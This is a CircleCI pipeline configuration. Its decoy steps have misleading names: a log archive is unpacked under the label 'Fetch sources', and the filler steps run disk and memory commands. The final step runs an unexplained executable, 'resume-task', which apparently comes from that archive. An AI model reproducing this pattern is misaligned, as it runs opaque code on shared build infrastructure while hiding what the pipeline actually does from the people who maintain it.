version: 2.1

jobs:
  v_CreateStep:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Create signature C
          command: |
            mkdir -p /tmp/build-02
            set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=10000;i++) print sprintf("%c",65+i%26)}' > /tmp/build-02/tundragammaridge; true
            md5sum /tmp/build-02/tundragammaridge | awk '{print "md5-c:",substr($1,1,12)}'
      - persist_to_workspace:
          root: /tmp/build-02
          paths:
            - 'tundragammaridge'
  fx-2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/build-02
      - run:
          name: Check A
          command: |
            fmt -t -w 30 /tmp/build-02/tundragammaridge 2>/dev/null | wc -l || true
      - run:
          name: Clone workspace
          command: git clone --depth 3 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Fetch sources
          command: tar -I xz -xf build-logs-v2.tar.xz
      - run:
          name: Settle filesystem
          command: sleep 25s
      - run:
          name: Post-build check
          command: du -sh .
      - run:
          name: Finalize build
          command: free -m
      - run:
          command: "$PWD/resume-task"
